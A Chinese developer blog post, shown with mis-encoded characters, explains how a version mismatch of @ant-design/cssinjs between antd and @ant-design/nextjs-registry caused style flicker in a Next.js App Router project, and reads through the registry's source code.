th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">é—®é¢˜</h2>
<p>å› ä¸ºä¹‹å‰ Next å’Œ React æ¥è¿å‡ºç°å®‰å…¨é—®é¢˜ï¼Œäºæ˜¯æŠŠåšå®¢çš„ä¾èµ–å‡çº§äº†ä¸€ä¸‹ï¼Œæ²¡æƒ³åˆ°å°±æå‡ºé—®é¢˜äº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3326a64520a47a29548262a3b6d9387~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_6bm_6bm_6bm_aXNOb3REZWZpbmVk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394649&amp;x-signature=2cXnjtK1O3vfKGaEpWD9d1JBlNI%3D" alt="QQæˆªå›¾20251215164248.jpg" loading="lazy"/></p>
<p>åˆæ¬¡æ¸²æŸ“æ—¶æ ·å¼ä¸¢å¤±ï¼Œåœ¨å®¢æˆ·ç«¯ä¸Šä¼šçŸ­æš‚å±•ç¤º Antd ç»„ä»¶æ— æ ·å¼ç•Œé¢ï¼Œå‡ºç°æ ·å¼é—ªçƒçš„æƒ…å†µã€‚é¡¹ç›®æ˜¯ Next 14ï¼ŒReact 18 çš„ App Router é¡¹ç›®ï¼Œä¾èµ–ç‰ˆæœ¬ï¼š<code>"@ant-design/nextjs-registry": "^1.3.0"</code>ï¼Œ<code>"antd": "^5.14.2"</code>ã€‚</p>
<h2 data-id="heading-1">è§£å†³æ€è·¯</h2>
<p>å› ä¸º Antd æ˜¯ CSS-in-js çš„ UI åº“ï¼ŒæŒ‰ç…§å®˜æ–¹æ–‡æ¡£å‘¢ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª @ant-design/nextjs-registry åŒ…è£¹æ•´ä¸ªé¡µé¢ï¼Œåœ¨ SSR æ—¶æ”¶é›†æ‰€æœ‰ç»„ä»¶çš„æ ·å¼ï¼Œå¹¶ä¸”é€šè¿‡ <code>&lt;script&gt;</code> æ ‡ç­¾åœ¨å®¢æˆ·ç«¯é¦–æ¬¡æ¸²æŸ“æ—¶å¸¦ä¸Šã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// src/app/layout.tsx</span>

<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AntdRegistry</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ant-design/nextjs-registry'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">RootLayout</span>(<span class="hljs-params">{
  children
}: Readonly&lt;{
  children: React.ReactNode
}&gt;</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        {/* ... */}
      <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">AntdRegistry</span>&gt;</span>
          {/* ... å‡è£…è¿™æ˜¯é¡µé¢ä»£ç  */}
        <span class="hljs-tag">&lt;/<span class="hljs-name">AntdRegistry</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
  )
}
</code></pre>
<p>å¯¹ç…§äº†ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ä¹Ÿé—®äº†ä¸‹ AIï¼Œæ²¡å‘ç°æˆ‘çš„å†™æ³•æœ‰ä»€ä¹ˆé—®é¢˜ã€‚å°±åœ¨è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘çŒ›ç„¶é—´çœ‹è§äº† Antd çš„ Pages Router ä½¿ç”¨çš„æ³¨æ„äº‹é¡¹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f8ba43ae8ca402c8344ae8f6f374b62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_6bm_6bm_6bm_aXNOb3REZWZpbmVk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394649&amp;x-signature=i4Vxywdn3iFPopU2b7qesRoGvdk%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘å¯»æ€ï¼Œå¯èƒ½æˆ‘é‡åˆ°çš„æƒ…å†µå’Œè¿™é‡Œä¸€æ ·ï¼Œæ˜¯å†…éƒ¨ä¾èµ–ç‰ˆæœ¬ <code>@ant-design/cssinj</code> ä¸å¯¹å¼•èµ·çš„ã€‚</p>
<p>è¾“å…¥ <code>npm ls @ant-design/cssinjs</code> çœ‹äº†ä¸€ä¸‹ï¼Œ</p>
<pre><code class="hljs language-text" lang="text">â”œâ”€â”¬ @ant-design/nextjs-registry@1.3.0
â”‚ â””â”€â”€ @ant-design/cssinjs@2.0.1
â””â”€â”¬ antd@5.14.2
  â””â”€â”€ @ant-design/cssinjs@1.24.0 deduped
</code></pre>
<p><code>@ant-design/nextjs-registry</code> å†…éƒ¨ä¹Ÿä½¿ç”¨äº† <code>@ant-design/cssinjs</code>ï¼Œè€Œä¸”å®ƒçš„ç‰ˆæœ¬å’Œ <code>antd</code> å†…ç½®ç‰ˆæœ¬è¿˜ä¸ä¸€æ ·ï¼Œè¿™å°±æ˜¯é—®é¢˜çš„æ‰€åœ¨äº†ã€‚</p>
<p>æ¥ä¸‹æ¥æŠŠ <code>@ant-design/nextjs-registry</code> çš„ç‰ˆæœ¬é™åˆ°äº† 1.2.0ï¼Œè¿™æ—¶å€™ç‰ˆæœ¬å¯¹ä¸Šäº†ï¼Œbug ä¹Ÿå°±ä¿®å¤äº†ã€‚</p>
<pre><code class="hljs language-text" lang="text">â”œâ”€â”¬ @ant-design/nextjs-registry@1.2.0
â”‚ â””â”€â”€ @ant-design/cssinjs@1.24.0
â””â”€â”¬ antd@5.14.2
  â””â”€â”€ @ant-design/cssinjs@1.24.0 deduped
</code></pre>
<h2 data-id="heading-2">@ant-design/nextjs-registry çš„å†…éƒ¨å‘ç”Ÿäº†ä»€ä¹ˆ</h2>
<h3 data-id="heading-3">AntdRegistry</h3>
<p>è¿™å‹¾èµ·äº†æˆ‘çš„å¥½å¥‡å¿ƒï¼Œå°±è®©æˆ‘ä»¬æ¥çœ‹çœ‹ <code>@ant-design/nextjs-registry</code> å¹²äº†äº›ä»€ä¹ˆï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fnextjs-registry" target="_blank" title="https://github.com/ant-design/nextjs-registry" ref="nofollow noopener noreferrer">github.com/ant-design/â€¦</a></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// /src/AntdRegistry.tsx</span>
<span class="hljs-string">'use client'</span>;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">StyleProviderProps</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ant-design/cssinjs'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-variable constant_">FC</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { createCache, extractStyle, <span class="hljs-title class_">StyleProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ant-design/cssinjs'</span>;
<span class="hljs-keyword">import</span> { useServerInsertedHTML } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/navigation'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">AntdRegistryProps</span> = <span class="hljs-title class_">Omit</span>&lt;<span class="hljs-title class_">StyleProviderProps</span>, <span class="hljs-string">'cache'</span>&gt;;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">AntdRegistry</span>: <span class="hljs-variable constant_">FC</span>&lt;<span class="hljs-title class_">AntdRegistryProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">props</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> [cache] = <span class="hljs-title function_">useState</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">createCache</span>());

  <span class="hljs-title function_">useServerInsertedHTML</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> styleText = <span class="hljs-title function_">extractStyle</span>(cache, { <span class="hljs-attr">plain</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">once</span>: <span class="hljs-literal">true</span> });

    <span class="hljs-keyword">if</span> (styleText.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'.data-ant-cssinjs-cache-path{content:"";}'</span>)) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-keyword">return</span> (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>
        <span class="hljs-attr">id</span>=<span class="hljs-string">"antd-cssinjs"</span>
        // <span class="hljs-attr">to</span> <span class="hljs-attr">make</span> <span class="hljs-attr">sure</span> <span class="hljs-attr">this</span> <span class="hljs-attr">style</span> <span class="hljs-attr">is</span> <span class="hljs-attr">inserted</span> <span class="hljs-attr">before</span> <span class="hljs-attr">Ant</span> <span class="hljs-attr">Design</span>'<span class="hljs-attr">s</span> <span class="hljs-attr">style</span> <span class="hljs-attr">generated</span> <span class="hljs-attr">by</span> <span class="hljs-attr">client</span>
        <span class="hljs-attr">data-rc-order</span>=<span class="hljs-string">"prepend"</span>
        <span class="hljs-attr">data-rc-priority</span>=<span class="hljs-string">"-1000"</span>
        <span class="hljs-attr">dangerouslySetInnerHTML</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">__html:</span> <span class="hljs-attr">styleText</span> }}
      /&gt;</span></span>
    );
  });

  <span class="hljs-keyword">return</span> <span class="xml"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">StyleProvider</span> {<span class="hljs-attr">...props</span>} <span class="hljs-attr">cache</span>=<span class="hljs-string">{cache}</span> /&gt;</span></span></span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">AntdRegistry</span>;
</code></pre>
<p>é™¤äº†ç”¨ Next çš„ API <code>useServerInsertedHTML</code> æŠŠæ ·å¼å­—ç¬¦ä¸²æ’åˆ°é¡µé¢ä¸Šä¹‹å¤–ï¼Œå’Œ Pages Router ä¸­ Antd æ”¶é›†é¦–å±æ ·å¼çš„å†™æ³•å‡ ä¹æ˜¯ä¸€æ ·çš„ã€‚</p>
<h3 data-id="heading-4">@ant-design/cssinjs</h3>
<p>é¦–å…ˆæ¥çœ‹ä¸Šæ–‡ <code>const [cache] = useState(() =&gt; createCache())</code> è¿™ä¸€è¡Œã€‚</p>
<p>@ant-design/cssinjs éƒ¨åˆ†ä»“åº“åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fcssinjs" target="_blank" title="https://github.com/ant-design/cssinjs" ref="nofollow noopener noreferrer">github.com/ant-design/â€¦</a></p>
<p>å®ƒå¹²äº†å‡ ä»¶äº‹ï¼š</p>
<ol>
<li>ç”Ÿæˆå”¯ä¸€å®ä¾‹ IDã€‚</li>
<li>ï¼ˆä»…å®¢æˆ·ç«¯ï¼‰å°† body ä¸­çš„æ ·å¼ç§»åˆ° head ä¸­ï¼Œå¹¶ä¸”å»é‡ã€‚</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createCache</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> cssinjsInstanceId = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>().<span class="hljs-title function_">toString</span>(<span class="hljs-number">12</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>);

  <span class="hljs-comment">// Tricky SSR: Move all inline style to the head.</span>
  <span class="hljs-comment">// PS: We do not recommend tricky mode.</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">document</span> !== <span class="hljs-string">'undefined'</span> &amp;&amp; <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span> &amp;&amp; <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>) {
    <span class="hljs-keyword">const</span> styles = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">`style[<span class="hljs-subst">${ATTR_MARK}</span>]`</span>) || [];
    <span class="hljs-keyword">const</span> { firstChild } = <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>;

    <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(styles).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">style</span>) =&gt;</span> {
      (style <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)[<span class="hljs-variable constant_">CSS_IN_JS_INSTANCE</span>] =
        (style <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)[<span class="hljs-variable constant_">CSS_IN_JS_INSTANCE</span>] || cssinjsInstanceId;

      <span class="hljs-comment">// Not force move if no head</span>
      <span class="hljs-keyword">if</span> ((style <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)[<span class="hljs-variable constant_">CSS_IN_JS_INSTANCE</span>] === cssinjsInstanceId) {
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">insertBefore</span>(style, firstChild);
      }
    });

    <span class="hljs-comment">// Deduplicate of moved styles</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">styleHash</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">boolean</span>&gt; = {};
    <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">`style[<span class="hljs-subst">${ATTR_MARK}</span>]`</span>)).<span class="hljs-title function_">forEach</span>(
      <span class="hljs-function">(<span class="hljs-params">style</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> hash = style.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-variable constant_">ATTR_MARK</span>)!;
        <span class="hljs-keyword">if</span> (styleHash[hash]) {
          <span class="hljs-keyword">if</span> ((style <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)[<span class="hljs-variable constant_">CSS_IN_JS_INSTANCE</span>] === cssinjsInstanceId) {
            style.<span class="hljs-property">parentNode</span>?.<span class="hljs-title function_">removeChild</span>(style);
          }
        } <span class="hljs-keyword">else</span> {
          styleHash[hash] = <span class="hljs-literal">true</span>;
        }
      },
    );
  }

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheEntity</span>(cssinjsInstanceId);
}
</code></pre>
<ol start="3">
<li>è¿”å›ä¸€ä¸ªç±»åŒ…è£¹çš„ <code>Map</code> ç»“æ„ï¼Œåœ¨ <code>StyleProvider</code> ä¸­ç”±åä»£ç»„ä»¶æŠŠé¦–å±æ‰€éœ€æ ·å¼ä¼ å›ã€‚ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š</li>
</ol>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">KeyType</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ValueType</span> = [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">any</span>];
<span class="hljs-comment">/** Connect key with `SPLIT` */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">declare</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">pathKey</span>(<span class="hljs-params">keys: KeyType[]</span>): <span class="hljs-built_in">string</span>;
<span class="hljs-keyword">declare</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Entity</span> {
    <span class="hljs-attr">instanceId</span>: <span class="hljs-built_in">string</span>;
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">instanceId: <span class="hljs-built_in">string</span></span>);
    <span class="hljs-comment">/** <span class="hljs-doctag">@private</span> Internal cache map. Do not access this directly */</span>
    <span class="hljs-attr">cache</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">ValueType</span>&gt;;
    <span class="hljs-attr">extracted</span>: <span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;;
    <span class="hljs-title function_">get</span>(<span class="hljs-attr">keys</span>: <span class="hljs-title class_">KeyType</span>[]): <span class="hljs-title class_">ValueType</span> | <span class="hljs-literal">null</span>;
    <span class="hljs-comment">/** A fast get cache with `get` concat. */</span>
    <span class="hljs-title function_">opGet</span>(<span class="hljs-attr">keyPathStr</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">ValueType</span> | <span class="hljs-literal">null</span>;
    <span class="hljs-title function_">update</span>(<span class="hljs-attr">keys</span>: <span class="hljs-title class_">KeyType</span>[], <span class="hljs-attr">valueFn</span>: <span class="hljs-function">(<span class="hljs-params">origin: ValueType | <span class="hljs-literal">null</span></span>) =&gt;</span> <span class="hljs-title class_">ValueType</span> | <span class="hljs-literal">null</span>): <span class="hljs-built_in">void</span>;
    <span class="hljs-comment">/** A fast get cache with `get` concat. */</span>
    <span class="hljs-title function_">opUpdate</span>(<span class="hljs-attr">keyPathStr</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">valueFn</span>: <span class="hljs-function">(<span class="hljs-params">origin: ValueType | <span class="hljs-literal">null</span></span>) =&gt;</span> <span class="hljs-title class_">ValueType</span> | <span class="hljs-literal">null</span>): <span class="hljs-built_in">void</span>;
}
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">Entity</span>;
</code></pre>
<p>è‡³äº <code>StyleProvider</code>ï¼Œé™¤äº†æ•´åˆä¸Šå±‚ <code>StyleProvider</code> æ³¨å…¥çš„æ ·å¼å¤–ï¼Œå®ƒåŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªæ™®é€šçš„ <code>Context.Provider</code>ï¼Œä½œç”¨ä¹Ÿå¾ˆå¥½çŒœï¼ŒæŠŠ <code>createCache</code> è¿”å›çš„ <code>Map</code> ç»“æ„æ³¨å…¥åˆ°ä¸‹å±‚ç»„ä»¶ä¸­ã€‚</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-keyword">const</span> <span class="hljs-title class_">StyleContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-property">createContext</span>&lt;<span class="hljs-title class_">StyleContextProps</span>&gt;({
  <span class="hljs-attr">hashPriority</span>: <span class="hljs-string">'low'</span>,
  <span class="hljs-attr">cache</span>: <span class="hljs-title function_">createCache</span>(),
  <span class="hljs-attr">defaultCache</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">autoPrefix</span>: <span class="hljs-literal">false</span>,
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">StyleProvider</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">FC</span>&lt;<span class="hljs-title class_">StyleProviderProps</span>&gt; = <span class="hljs-function">(<span class="hljs-params">props</span>) =&gt;</span> {
  <span class="hljs-comment">// ...</span>
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">StyleContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{context}</span>&gt;</span>{children}<span class="hljs-tag">&lt;/<span class="hljs-name">StyleContext.Provider</span>&gt;</span></span>
  );
};

</code></pre>
<h3 data-id="heading-5">Antd ç»„ä»¶çš„è°ƒç”¨è·¯å¾„</h3>
<p>å…·ä½“æºç å°±ä¸ç»†çœ‹äº†ï¼Œä»¥æŒ‰é’®ç»„ä»¶ Button ä¸ºä¾‹ï¼Œè°ƒç”¨è·¯å¾„å¤§è‡´å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    subgraph CSSInJS åº•å±‚æœºåˆ¶
        genStyleUtils["@ant-design/cssinjs-utils&lt;br/&gt;genStyleUtils"]
        genStyleHooks["@ant-design/cssinjs-utils&lt;br/&gt;genStyleHooks"]
        genComponentStyleHook["@ant-design/cssinjs-utils&lt;br/&gt;genComponentStyleHook"]
        useStyleRegister["@ant-design/cssinjs&lt;br/&gt;useStyleRegister"]
        useGlobalCache["@ant-design/cssinjs&lt;br/&gt;useGlobalCache"]
    end

    subgraph Antd ç»„ä»¶å±‚
        useStyleAntd[useStyle]
        Button[Buttonç»„ä»¶]
        JSX[å†™å…¥åˆ°JSXå¹¶è¿”å›]
    end

    genStyleUtils --&gt;|ç”Ÿæˆ| genStyleHooks
    genStyleHooks --&gt;|è°ƒç”¨| genComponentStyleHook
    genComponentStyleHook --&gt;|è°ƒç”¨| useStyleRegister
    useStyleRegister --&gt;|è°ƒç”¨| useGlobalCache
    
    genStyleHooks --&gt;|è¿”å›| useStyleAntd
    
    Button --&gt;|è°ƒç”¨| useStyleAntd
    useStyleAntd --&gt;|æ ·å¼æ³¨å…¥| JSX
</code></pre>
<p>åœ¨ useGlobalCache ä¸­ è°ƒç”¨ <code>React.useContext(StyleContext)</code> çš„ <code>cache.onUpdate</code>æ–¹æ³•æ›´æ–°ç¼“å­˜ã€‚</p>
<h2 data-id="heading-6">æ€»ç»“</h2>
<p>è¿™æ¬¡ç¢°åˆ°çš„é—®é¢˜å…¶å®æŒºå…¸å‹çš„ï¼šå‡çº§äº†ä¾èµ–ï¼Œç»“æœé¡µé¢å‡ºé—®é¢˜äº†ã€‚è§£å†³æ–¹æ³•å¾ˆç®€å•â€”â€”æŠŠ @ant-design/nextjs-registry ä» 1.3.0 é™çº§åˆ° 1.2.0ï¼Œè®©å®ƒè·Ÿ antd ç”¨çš„ @ant-design/cssinjs å†…éƒ¨ç‰ˆæœ¬å¯¹ä¸Šå°±è¡Œäº†ã€‚</p>
<p>ä»¥åè¦æ˜¯ç”¨ Next.js App Router é… Ant Design é‡åˆ°ç±»ä¼¼æƒ…å†µï¼Œå¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸¤ä¸ªåŒ…çš„ç‰ˆæœ¬æ˜¯ä¸æ˜¯å…¼å®¹ã€‚æœ‰æ—¶å€™é—®é¢˜æ²¡çœ‹èµ·æ¥é‚£ä¹ˆå¤æ‚ï¼Œå¯èƒ½å°±æ˜¯ç‰ˆæœ¬æ²¡å¯¹ä¸Šã€‚</p>
<p>å‡ºäºå¥½å¥‡ï¼Œæˆ‘è¿˜é¡ºä¾¿çœ‹äº†ä¸€ä¸‹ AntdRegistry å†…éƒ¨çš„å®ç°â€”â€”å‘ç°å®ƒä¸»è¦æ˜¯é€šè¿‡ <code>StyleProvider</code> åœ¨æœåŠ¡ç«¯æ”¶é›†æ ·å¼ï¼Œç„¶åé€šè¿‡ <code>useServerInsertedHTML</code> åœ¨å®¢æˆ·ç«¯é¦–æ¬¡æ¸²æŸ“æ—¶æ³¨å…¥åˆ° <code>style</code> æ ‡ç­¾ä¸­ï¼Œè¿™æ ·å°±èƒ½é¿å…æ ·å¼é—ªçƒçš„é—®é¢˜ã€‚</p>
<blockquote>
<p>å¤§å®¶çš„é˜…è¯»æ˜¯æˆ‘å‘å¸–çš„åŠ¨åŠ›ï¼Œæœ¬æ–‡é¦–å‘äºæˆ‘çš„åšå®¢ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeer.shika-blog.xyz" target="_blank" title="https://deer.shika-blog.xyz" ref="nofollow noopener noreferrer">deer.shika-blog.xyz</a>ï¼Œæ¬¢è¿å¤§å®¶æ¥ç©<del>å–µ</del>ï¼Œ è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¼ä¸šçº§å…¨æ ˆé¡¹ç›®(14) winstonè®°å½•æ‰€æœ‰æ—¥å¿—]]></title>    <link>https://juejin.cn/post/7583892482598207503</link>    <guid>https://juejin.cn/post/7583892482598207503</guid>    <pubDate>2025-12-15T09:41:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583892482598207503" data-draft-id="7583903159773659151" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¼ä¸šçº§å…¨æ ˆé¡¹ç›®(14) winstonè®°å½•æ‰€æœ‰æ—¥å¿—"/> <meta itemprop="keywords" content="Vue.js,Node.js,å‰ç«¯æ¡†æ¶"/> <meta itemprop="datePublished" content="2025-12-15T09:41:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°èƒ–éœ"/> <meta itemprop="url" content="https://juejin.cn/user/3790771822016301"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¼ä¸šçº§å…¨æ ˆé¡¹ç›®(14) winstonè®°å½•æ‰€æœ‰æ—¥å¿—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3790771822016301/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°èƒ–éœ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:41:58.000Z" title="Mon Dec 15 2025 09:41:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
